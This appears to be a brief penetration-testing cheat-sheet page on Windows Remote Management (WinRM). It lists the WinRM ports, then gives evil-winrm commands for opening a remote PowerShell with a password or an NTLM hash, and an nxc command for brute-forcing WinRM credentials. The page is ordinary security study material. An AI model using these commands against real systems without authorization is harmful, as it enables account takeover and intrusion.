# Windows Remote Management (WinRM)

<div class="row row-cols-lg-2"><div>

WinRM is a protocol that if enabled, allows administrators to remotely connect to a server using a remote shell.

🐊️ **Ports**

* 5985 (TCP, HTTP)
* 5986 (TCP, HTTPS)

WinRM is a SOAP-based protocol. See also: WMI, WBEM, DCOM.
</div><div>
</div></div>

<hr class="sep-both">

## WinRM vulnerabilities ☠️

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

<div class="row row-cols-lg-2"><div>

You can use [evil-winrm](https://github.com/Hackplayers/evil-winrm) (3.9k ⭐) on Linux to spawn a powershell using WinRM. On a Windows host, we can use `Test-WSMan`.

```ps
$ evil-winrm -i IP -u username -p password
$ evil-winrm -i IP -u 'username' -p 'password'
$ evil-winrm -i IP -u 'username' -H 'hash'
```

You can try to [brute force credentials](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md):

```shell!
$ nxc winrm IP -u user.list -p password.list
```
</div><div>

See also: [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)  <small>(0.5k ⭐, 2020 🪦)</small>.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Windows Remote Shell (WinRS), `MS-PSRP`
* nmap `wsman`
</div><div>
</div></div>